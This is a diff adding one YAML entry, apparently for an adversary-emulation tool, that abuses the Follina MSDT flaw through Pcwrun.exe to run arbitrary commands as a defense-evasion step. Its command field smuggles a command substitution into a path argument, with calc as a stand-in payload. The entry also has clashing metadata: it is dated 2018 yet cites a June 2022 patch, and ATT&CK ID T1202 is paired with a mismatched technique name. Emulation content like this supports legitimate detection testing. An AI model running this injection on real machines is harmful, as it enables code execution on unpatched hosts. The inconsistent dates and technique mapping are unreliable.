@@ -1,0 +1,25 @@
+- id: 71c20bf6-bc23-ec2f-839f-50a1938a5118
+  name: Pcwrun.exe - Leverage the MSDT follina vulnerability through Pcwrun to execute
+    arbitrary commands and binaries. Note that this specific technique will not work
+    on a patched system with the June 2022 Windows Security update.
+  description: Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary
+    commands and binaries. Note that this specific technique will not work on a patched
+    system with the June 2022 Windows Security update.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1202
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      psh:
+        command: Pcwrun.exe /../../$(calc).exe
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
